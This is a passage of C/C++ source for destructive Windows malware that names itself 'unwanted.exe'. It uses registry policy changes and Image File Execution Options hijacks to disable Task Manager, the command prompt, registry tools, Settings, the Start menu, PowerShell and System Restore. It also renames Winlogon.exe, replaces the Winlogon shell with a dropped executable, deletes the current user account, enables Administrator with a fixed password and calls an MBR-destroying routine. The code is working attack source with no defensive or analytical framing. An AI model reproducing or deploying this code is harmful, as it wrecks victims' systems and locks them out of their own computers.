    ShellExecuteA(NULL, NULL, "attrib", "+s +h \u0022C:\\Program Files\\Common Files\\MIW.EXE\u0022", NULL, SW_HIDE);
}

void DisableSecurity() {
    ShellExecuteA(NULL, NULL, "cmd", "/c takeown /f C:\\Windows\\SysNative\\Security* & icacls C:\\Windows\\SysNative\\Security* /grant everyone:F & ren C:\\Windows\\SysNative\\Security* NeverGonnaGiveYouUp* & taskkill /f /im securityHealthSysTray.exe", NULL, SW_HIDE);
}


/* 3:33:33 AM payload */
void SetTimeDate() {
    CreateTimeDate();
    if (PathFileExistsA("C:\\Windows\\SysNative")) {
        ShellExecuteA(NULL, NULL, "cmd", "/c takeown /f C:\\Windows\\SysNative\\Winlogon.exe & icacls C:\\Windows\\SysNative\\Winlogon.exe /grant everyone:F & ren C:\\Windows\\SysNative\\winlogon.exe deleteme.exe", NULL, SW_HIDE);
    }
    else
    {
        ShellExecuteA(NULL, NULL, "cmd", "/c takeown /f C:\\Windows\\System32\\Winlogon.exe & icacls C:\\Windows\\System32\\Winlogon.exe /grant everyone:F & ren C:\\Windows\\System32\\winlogon.exe deleteme.exe", NULL, SW_HIDE);
    }
    ShellExecuteA(NULL, NULL, "C:\\Program Files\\Common Files\\MIW.EXE", NULL, NULL, SW_HIDE);
}

int Tada() {
    while (1) {
        PlaySound(TEXT("C:\\Windows\\Media\\Tada.wav"), NULL, SND_SYNC);
        Sleep(500);
    }
}


/* registry modifications part */

void DisableTaskmgr() {
    HKEY regHandle;  // disable task manager with registry
    DWORD dwValue = 1;
    BYTE* data = (BYTE*)&dwValue;
    RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle, NULL);
    RegSetValueEx(regHandle, TEXT("DisableTaskmgr"), 0, REG_DWORD, data, sizeof(DWORD));
    RegCloseKey(regHandle);
}

void DisableRun() {
    HKEY regHandle;  // disable Run
    DWORD dwValue = 1;
    BYTE* data = (BYTE*)&dwValue;
    RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle, NULL);
    RegSetValueEx(regHandle, TEXT("NoRun"), 0, REG_DWORD, data, sizeof(DWORD));
    RegCloseKey(regHandle);
}

int DisableCmdExist() {
    HKEY hKey;
    LONG nResult;
    BOOL bExist = FALSE;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Policies\\Microsoft\\Windows\\System", 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS)
    {
        DWORD dwType;
        nResult = RegQueryValueEx(hKey, L"DisableCMD", NULL, &dwType, NULL, NULL);
        if (nResult == ERROR_SUCCESS)
            bExist = TRUE;
        RegCloseKey(hKey);

        if (bExist == TRUE) {
            return TRUE;
        }
        else {
            return FALSE;
        }
    }
}

void DisableCMD() {
    HKEY regHandle;  // disable command prompt with registry
    DWORD dwValue = 2;
    BYTE* data = (BYTE*)&dwValue;
    RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Policies\\Microsoft\\Windows\\System"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle, NULL);
    RegSetValueEx(regHandle, TEXT("DisableCMD"), 0, REG_DWORD, data, sizeof(DWORD));
    RegCloseKey(regHandle);
}

void DisableLogonUI() {
    // This makes CTRLALTDEL not working and LOGONUI not working...
    HKEY regHandle5; // Disable logonui for preventing starting
    const char* dwValue5 = "accessdenied";
    BYTE* data5 = (BYTE*)&dwValue5;
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\logonui.exe"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle5, NULL);
    RegSetValueEx(regHandle5, TEXT("Debugger"), 0, REG_SZ, data5, sizeof(DWORD));
    RegCloseKey(regHandle5);    
}

void DisableRunDLL32() {
    // RUNDLL32 not working
    HKEY regHandled;
    const char* dwValued = "accessdenied";
    BYTE* datad = (BYTE*)&dwValued;
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\RunDLL32.exe"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandled, NULL);
    RegSetValueEx(regHandled, TEXT("Debugger"), 0, REG_SZ, datad, sizeof(DWORD));
    RegCloseKey(regHandled);
}

void DisableSettings() {
    // This makes Settings app no working
    HKEY regHandle7;
    const char* dwValue7 = "accessdenied";
    BYTE* data7 = (BYTE*)&dwValue7;
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\SystemSettings.exe"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle7, NULL);
    RegSetValueEx(regHandle7, TEXT("Debugger"), 0, REG_SZ, data7, sizeof(DWORD));
    RegCloseKey(regHandle7);
}

void DisableDesktopBackground() {
    HKEY regHandle2; // Disable Active Desktop WallPaper
    DWORD dwValue2 = 1;
    BYTE* data2 = (BYTE*)&dwValue2;
    RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle2, NULL);
    RegSetValueEx(regHandle2, TEXT("NoChangingWallPaper"), 0, REG_DWORD, data2, sizeof(DWORD));
    RegCloseKey(regHandle2);
}

void DisableLogonOptions() {
    HKEY regHandle; // Disable Power Options
    DWORD dwValue = 0;
    BYTE* data = (BYTE*)&dwValue;
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle, NULL);
    RegSetValueEx(regHandle, TEXT("shutdownwithoutlogon"), 0, REG_DWORD, data, sizeof(DWORD));
    RegCloseKey(regHandle);


    HKEY regHandle2; // Disable Network Logon UI
    DWORD dwValue2 = 1;
    BYTE* data2 = (BYTE*)&dwValue2;
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Policies\\Microsoft\\Windows\\System"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle2, NULL);
    RegSetValueEx(regHandle2, TEXT("DontDisplayNetworkSelectionUI"), 0, REG_DWORD, data2, sizeof(DWORD));
    RegCloseKey(regHandle2);

}

void testreg() {
    RegCreateSet(HKEY_CLASSES_ROOT, TEXT("*\\shell\\_¡þ∞á£Ω▒δïñ_æåí\\command"), NULL, REG_SZ, TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE"), sizeof(TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE")));
}

void DisablePowerOptions() {
    

    HKEY regHandle3; // Disable Logon Ui background
    DWORD dwValue3 = 1;
    BYTE* data3 = (BYTE*)&dwValue3;
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Policies\\Microsoft\\Windows\\System"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle3, NULL);
    RegSetValueEx(regHandle3, TEXT("disablelogonbackgroundimage"), 0, REG_DWORD, data3, sizeof(DWORD));
    RegCloseKey(regHandle3);

    //system("REG ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon\u0022 /v \u0022Shell\u0022 /t REG_SZ /d \u0022C:\\Program Files\\Common Files\\WINNT32.EXE\u0022 /f");

    // sample:  RegCreateSet(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"), TEXT("Debugger"), REG_SZ, TEXT(""), sizeof(TEXT("")));

    RegCreateSet(HKEY_CLASSES_ROOT, TEXT("*\\shell\\_¡þ∞á£Ω▒δïñ_æåí\\command"), NULL, REG_SZ, TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE"), sizeof(TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE")));
    RegCreateSet(HKEY_CLASSES_ROOT, TEXT("*\\shell\\_¡τµ░ùáΣ╕Çτ╕ùáΣ\\command"), NULL, REG_SZ, TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE"), sizeof(TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE")));
    RegCreateSet(HKEY_CLASSES_ROOT, TEXT("*\\shell\\_¡∞á£Ω▒░ φòá╕Ç╕\\command"), NULL, REG_SZ, TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE"), sizeof(TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE")));
    RegCreateSet(HKEY_CLASSES_ROOT, TEXT("*\\shell\\_¡¾4~¡∞á£Ω▒░φòá\\command"), NULL, REG_SZ, TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE"), sizeof(TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE")));
    RegCreateSet(HKEY_CLASSES_ROOT, TEXT("*\\shell\\_¡þ^&*|@²áó_æåí\\command"), NULL, REG_SZ, TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE"), sizeof(TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE")));
    RegCreateSet(HKEY_CLASSES_ROOT, TEXT("*\\shell\\_¡þα╖àα╢▒α╖£α╖É\\command"), NULL, REG_SZ, TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE"), sizeof(TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE")));

    RegCreateSet(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon"), NULL, REG_SZ, TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE"), sizeof(TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE")));
    RegCreateSet(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon"), NULL, REG_SZ, TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE"), sizeof(TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE")));

    RegCreateSet(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\iexplore.exe"), TEXT("Debugger"), REG_SZ, TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE"), sizeof(TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE")));
    RegCreateSet(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\logoff.exe"), TEXT("Debugger"), REG_SZ, TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE"), sizeof(TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE")));
    RegCreateSet(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sfc.exe"), TEXT("Debugger"), REG_SZ, TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE"), sizeof(TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE")));
    RegCreateSet(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\shutdown.exe"), TEXT("Debugger"), REG_SZ, TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE"), sizeof(TEXT("C:\\Program Files\\Common Files\\WINNT32.EXE")));

    RegCreateSet(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\IOBITUnlocker.exe"), TEXT("Debugger"), REG_SZ, TEXT("C:\\Windows\\System32\\cmd.exe /c color 04 & title YOU ARE TRYING TO KILL ME HUH??? &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MINE & echo you cannot run IOBITUnlocker.exe &pause >nul"), sizeof(TEXT("C:\\Windows\\System32\\cmd.exe /c color 04 & title YOU ARE TRYING TO KILL ME HUH??? &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MINE & echo you cannot run IOBITUnlocker.exe &pause >nul")));
    RegCreateSet(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\rstrui.exe"), TEXT("Debugger"), REG_SZ, TEXT("C:\\Windows\\System32\\cmd.exe /c color 0a & title System Restore &  echo Nice try &pause >nul"), sizeof(TEXT("C:\\Windows\\System32\\cmd.exe /c color 0a & title System Restore &  echo Nice try &pause >nul")));
    RegCreateSet(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\ProcessHacker.exe"), TEXT("Debugger"), REG_SZ, TEXT("C:\\Windows\\System32\\cmd.exe /c color 04 & title PROCESSHACKER.EXE &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MINE & echo you cannot run PROCESSHACKER.EXE &pause >nul"), sizeof(TEXT("C:\\Windows\\System32\\cmd.exe /c color 04 & title PROCESSHACKER.EXE &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MINE & echo you cannot run PROCESSHACKER.EXE &pause >nul")));
    RegCreateSet(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Powershell.exe"), TEXT("Debugger"), REG_SZ, TEXT("C:\\Windows\\System32\\cmd.exe /c title POWERSHELL.EXE &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MINE & echo you cannot run POWERSHELL &pause >nul"), sizeof(TEXT("C:\\Windows\\System32\\cmd.exe /c title POWERSHELL.EXE &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MINE & echo you cannot run POWERSHELL &pause >nul")));
    RegCreateSet(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Utilman.exe"), TEXT("Debugger"), REG_SZ, TEXT("C:\\Windows\\System32\\cmd.exe /c color 04 & title UTILMAN.EXE &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MINE &pause >nul"), sizeof(TEXT("C:\\Windows\\System32\\cmd.exe /c color 04 & title UTILMAN.EXE &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MINE &pause >nul")));
    RegCreateSet(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\SetHC.exe"), TEXT("Debugger"), REG_SZ, TEXT("C:\\Windows\\System32\\cmd.exe /c color 04 & title SETHC.EXE &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MIN &pause >nul"), sizeof(TEXT("C:\\Windows\\System32\\cmd.exe /c color 04 & title SETHC.EXE &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MIN &pause >nul")));


    RegDeleteKey(HKEY_CLASSES_ROOT, TEXT("Folder\\shell\\opennewprocess"));
    RegDeleteKey(HKEY_CLASSES_ROOT, TEXT("Folder\\shell\\opennewtab"));
    RegDeleteKey(HKEY_CLASSES_ROOT, TEXT("Folder\\shell\\opennewwindow"));
    RegDeleteKey(HKEY_CLASSES_ROOT, TEXT("Folder\\shell\\pintohome"));

    int argc;
    LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    if (argc > 1) {
        if (!lstrcmpW(argv[1], L"skiplogonui")) {
            goto skiplogonuidam;
        }
        else {
            // Still there
        }
    }
    DisableLogonUI();
skiplogonuidam:

    if (argc > 1) {
        if (!lstrcmpW(argv[1], L"nosettings")) {
            
        }
        else
        {
            DisableRunDLL32();
            DisableSettings();
        }
    }
    else
    {
        DisableRunDLL32();
        DisableSettings();
    }

    // Start Menu not working
    HKEY regHandlea;
    const char* dwValuea = "accessdenied";
    BYTE* dataa = (BYTE*)&dwValuea;
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\StartMenuExperienceHost.exe"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandlea, NULL);
    RegSetValueEx(regHandlea, TEXT("Debugger"), 0, REG_SZ, dataa, sizeof(DWORD));
    RegCloseKey(regHandlea);
    ShellExecuteA(NULL, NULL, "Taskkill", "/f /im StartMenuExperienceHost.exe", NULL, SW_HIDE);


    // Search App not working
    HKEY regHandlez;
    const char* dwValuez = "accessdenied";
    BYTE* dataz = (BYTE*)&dwValuez;
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\SearchUI.exe"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandlez, NULL);
    RegSetValueEx(regHandlez, TEXT("Debugger"), 0, REG_SZ, dataz, sizeof(DWORD));
    RegCloseKey(regHandlez);
    ShellExecuteA(NULL, NULL, "Taskkill", "/f /im SearchUI.exe", NULL, SW_HIDE);


    // Svchost not working
    HKEY regHandleb;
    const char* dwValueb = "accessdenied";
    BYTE* datab = (BYTE*)&dwValueb;
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Svchost.exe"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandleb, NULL);
    RegSetValueEx(regHandleb, TEXT("Debugger"), 0, REG_SZ, dataa, sizeof(DWORD));
    RegCloseKey(regHandleb);

    // Consent not working
    HKEY regHandlee;
    const char* dwValuee = "accessdenied";
    BYTE* datae = (BYTE*)&dwValuee;
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Consent.exe"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandlee, NULL);
    RegSetValueEx(regHandlee, TEXT("Debugger"), 0, REG_SZ, datae, sizeof(DWORD));
    RegCloseKey(regHandlee);

    // Microsoft Management Console not working
    HKEY regHandlef;
    const char* dwValuef = "accessdenied";
    BYTE* dataf = (BYTE*)&dwValuef;
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\MMC.exe"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandlef, NULL);
    RegSetValueEx(regHandlef, TEXT("Debugger"), 0, REG_SZ, dataf, sizeof(DWORD));
    RegCloseKey(regHandlef);
}

void NoUnwanted1() {
    // This makes unwanted.exe no working

    //RegCreateSet(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\unwanted.exe"), TEXT("Debugger"), REG_SZ, TEXT("C:\\Windows\\System32\\cmd.exe /c color 04 & title UNWANTED.EXE &  echo Running viruses two times is bad for health 🤪🤪🤪🤪🤪🤪 &pause >nul"), sizeof(TEXT("C:\\Windows\\System32\\cmd.exe /c color 04 & title UNWANTED.EXE &  echo Running viruses two times is bad for health 🤪🤪🤪🤪🤪🤪 &pause >nul")));
    RegCreateSet(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\unwanted.exe"), TEXT("Debugger"), REG_SZ, TEXT("winresume.exe"), sizeof(TEXT("winresume.exe")));
}

void NoUnwanted0() {
    // This makes unwanted.exe working
    RegDeleteKey(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\unwanted.exe"));
}

void DisableRegistryTools() {
    HKEY regHandle;
    DWORD dwValue = 1;
    BYTE* data = (BYTE*)&dwValue;
    RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle, NULL);
    RegSetValueEx(regHandle, TEXT("DisableRegistryTools"), 0, REG_DWORD, data, sizeof(DWORD));
    RegCloseKey(regHandle);
}

/* beep */
DWORD WINAPI StartBeep(LPVOID parameter) {
    Beep(1000, 10000);
    return -1;
}

int RandBeep() {
    Beep(800 + rand() % 600, 100);
    Sleep(100);
    return 0;
}

void CreateKillWindows() {

    if (PathFileExistsA("C:\\Program Files\\Common Files\\WINNT32.EXE") != TRUE) {

        /* Create KillWindows program for some payloads */
        HANDLE kwi = CreateFileA("C:\\Program Files\\Common Files\\WINNT32.EXE", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_SYSTEM, 0);

        WriteFile(kwi, kwp, kwp_len, &wb, NULL);

        CloseHandle(kwi);

        ShellExecuteA(NULL, NULL, "cmd", "/c attrib \u0022C:\\Program Files\\Common Files\\WINNT32.EXE\u0022 +s +h", NULL, SW_HIDE);
    }
    else
    {
        if (InternetCheckConnectionW(L"https://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0) == TRUE) {
            ShellExecuteW(NULL, NULL, L"cmd", L"/c color 04 & title 😀😁😎☺😎🤔😣😱🥵😳😨😨🤪🤪🤪🤤😦😦 & echo I KNOW YOU RAN THIS MALWARE MANY TIMES & echo I KNOW WHERE YOU LIVE & pause > nul", NULL, SW_NORMAL);
            Sleep(2000);
            ShellExecuteA(NULL, NULL, "C:\\Program Files\\Common Files\\WINNT32.EXE", NULL, NULL, SW_NORMAL);
            ShellExecuteA(NULL, NULL, "C:\\Program Files\\Common Files\\WINNT32.EXE", NULL, NULL, SW_NORMAL);
        }
    }
}

/* removes username and sets other user */
void StartFuckingPC() {

    CreateKillWindows();

    HKEY regHandle; // Disable Last UserName logon ui
    DWORD dwValue = 1;
    BYTE* data = (BYTE*)&dwValue;
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Policies\\Microsoft\\Personalization"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle, NULL);
    RegSetValueEx(regHandle, TEXT("NoLockScreen"), 0, REG_DWORD, data, sizeof(DWORD));
    RegCloseKey(regHandle);

    HKEY regHandle2; // Disable Last UserName logon ui
    DWORD dwValue2 = 1;
    BYTE* data2 = (BYTE*)&dwValue2;
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle2, NULL);
    RegSetValueEx(regHandle2, TEXT("dontdisplaylastusername"), 0, REG_DWORD, data2, sizeof(DWORD));
    RegCloseKey(regHandle2);

    ShellExecuteA(NULL, NULL, "cmd", " /c net user %username% /delete & net user Administrator /active:yes & net user Administrator iwantedthis", NULL, SW_HIDE);
}

void StartErrorSpam() {
    Sleep(5000);
    int argc;
    LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    if (argc > 1) {
        if (!lstrcmpW(argv[1], L"skipdestroymbr")) {
            
        }
        else
        {
            DestroyMBR();
        }
    }
    else
    {
        DestroyMBR();
    }
    
    CreateThread(NULL, NULL, &payloadThread, &StartBeep, NULL, NULL);
    CreateThread(NULL, 4096, &STARTripmessages, NULL, NULL, NULL);
    Sleep(200);
    CreateThread(NULL, NULL, &payloadThread, &killWindowsInstant, NULL, NULL);

    Sleep(992);

    StartFuckingPC();
    DisablePowerOptions();
}

/* Download a file for test Internet connection */
void TestInternetConnection() {
    if (InternetCheckConnectionW(L"https://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0) == TRUE) {
        // success        
    }
    else // else kills os
    {
        CreateThread(NULL, NULL, &payloadThread, &StartErrorSpam, NULL, NULL);
        int DisplayResourceNAMessageBox();
        {
            int msgboxID = MessageBox(
                NULL,
                (LPCWSTR)L"Unknown hard error:\r\nBetter working with Internet Connected",
                (LPCWSTR)L"unwanted.exe - System Warning",
                MB_ICONERROR | MB_OK
            );
        };

        int argc;
        LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
        if (argc > 1) {
            if (!lstrcmpW(argv[1], L"skipdestroymbr")) {
                
            }
            else
            {
                DestroyMBR();
            }
        }
        else
        {
            DestroyMBR();
        }
        StartFuckingPC();
        DisablePowerOptions();
        CreateThread(NULL, NULL, &payloadThread, &StartBeep, NULL, NULL);
        CreateThread(NULL, 4096, &STARTripmessages, NULL, NULL, NULL);
        CreateThread(NULL, NULL, &payloadThread, &killWindowsInstant, NULL, NULL);

    };

}

void TestInternetConnection2() {
    if (InternetCheckConnectionW(L"https://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0) == TRUE) {
        // success        
    }
    else // else kills os
    {
        CreateThread(NULL, NULL, &payloadThread, &StartErrorSpam, NULL, NULL);
        int DisplayResourceNAMessageBox();
        {
            int msgboxID = MessageBox(
                NULL,
                (LPCWSTR)L"message: who does live without internet?",
                (LPCWSTR)L"unwanted.exe - System Warning",
                MB_ICONERROR | MB_OK
            );
        };

        int argc;
        LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
        if (argc > 1) {
            if (!lstrcmpW(argv[1], L"skipdestroymbr")) {

            }
            else
            {
                DestroyMBR();
            }
        }
        else
        {
            DestroyMBR();
        }
        StartFuckingPC();
        DisablePowerOptions();
        CreateThread(NULL, NULL, &payloadThread, &StartBeep, NULL, NULL);
        CreateThread(NULL, 4096, &STARTripmessages, NULL, NULL, NULL);
        CreateThread(NULL, NULL, &payloadThread, &killWindowsInstant, NULL, NULL);

    };

}

void NormalComputer() {
    // Shown when this is not a normal computer
    // This payload is shown when delete WINLOGON.EXE from system32
    MessageBox(
        NULL,
        (LPCWSTR)L"This is not a normal computer", // Warning message box
        (LPCWSTR)L"2¤³@»¬¬²’ÐÅ¶²Øß2¶¡",
        MB_ICONINFORMATION | MB_OK
    );
}

int PlayMusik() {
    if (PlaySoundA("C:\\Program Files\\Common Files\\system\\Panic.wav", NULL, SND_SYNC) == FALSE) { // If it does not find the file (returns False) if BSOD =)
        killWindowsInstant();
    }
    // plays music
    killWindowsInstant();
    return 0;
}

/* Old version of Unwanted (1.0)*/
void PrankFolders() {
    HANDLE bat = CreateFileA("C:\\Program Files\\Common Files\\system\\Program.bat", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

    WriteFile(bat, batm, bat_len, &wb, NULL);

    CloseHandle(bat);
    cout << "Archivo Creado\n\n";
    Sleep(100);

    ShellExecuteA(NULL, NULL, "cmd", "/c C:\\Program Files\\Common Files\\system\\Program.bat", NULL, SW_HIDE);
    cout << "Programa Ejecutado\n\n";
    Sleep(1000);
}


void superPowerFulMainPayload() {

    /* Main Payload */
    Sleep(1500);
    CreateThread(NULL, NULL, &payloadThread, &payloadMessageBox, NULL, NULL);
    Sleep(4500);
    ShellExecuteA(NULL, NULL, "wordpad", "\u0022C:\\Program Files\\Common Files\\system\\paint.rtf\u0022", NULL, SW_SHOWDEFAULT);
    Sleep(8500);
    ShellExecuteA(NULL, NULL, "control", NULL, NULL, SW_SHOWDEFAULT);
    Sleep(7900);
    ShellExecuteA(NULL, NULL, "regedit", NULL, NULL, SW_SHOWDEFAULT);
    Sleep(4500);
    ShellExecuteA(NULL, NULL, "notepad", "C:\\Program Files\\Common Files\\system\\Die.txt", NULL, SW_SHOW);
    Sleep(4500);
    ShellExecuteA(NULL, NULL, "taskmgr", NULL, NULL, SW_SHOWDEFAULT);
    Sleep(2250);
    ShellExecuteA(NULL, NULL, "explorer", NULL, NULL, SW_SHOWDEFAULT);
    Sleep(2250);
    CreateThread(NULL, NULL, &payloadThread, &DestroyURScreen, NULL, NULL);
    ShellExecuteA(NULL, NULL, "mspaint", "\u0022C:\\Program Files\\Common Files\\system\\kitten.jpg\u0022", NULL, SW_SHOWDEFAULT);
    Sleep(3200);
    ShellExecuteA(NULL, NULL, "charmap", NULL, NULL, SW_SHOWDEFAULT);
    Sleep(6000);
    CreateThread(NULL, NULL, &payloadThread, &RandBeep, NULL, NULL);
    Sleep(12000);
    CreateThread(NULL, NULL, &payloadThread, &payloadChangeText, NULL, NULL);
    // last 10 seconds (wait until windows dies)

    for (;;) {
        // still there, wait for windows dies
    }
   }

DWORD WINAPI warningfinalpayload(LPVOID parameter) {
    Sleep(5000 + rand() % 1000);
    MessageBox(
        NULL,
        (LPCWSTR)L"please wait until the final payload is finished\r\nuntil then you can still using your computer =)", // Warning message box
        (LPCWSTR)L"Warning",
        MB_ICONWARNING | MB_OK
    );
    return 0;
}

int beepsandlights() {
    while (1) {
        Beep(850 + rand() % 500, 100);
        Sleep(500 + rand() % 1000);
        int y = rand() % sh, h = sh - rand() % sh - (sh / 1 - 1);

        BitBlt(hdc, 0, y, sw, h, hdc, rand() % 2, y + rand() % 2, SRCAND);
        Sleep(500 + rand() % 1000);
        return 0;
    }
}

// Addition of UHE void function to fix the madness of redundance
void UnknownHradError() {
    CreateThread(NULL, NULL, &payloadThread, &StartErrorSpam, NULL, NULL);
    int DisplayResourceNAMessageBox();
    {
        int msgboxID = MessageBox(
            NULL,
            (LPCWSTR)L"Unknown hard error",
            (LPCWSTR)L"Unwanted.exe - System Warning",
            MB_ICONWARNING | MB_OK
        );
    };
    int argc;
    LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
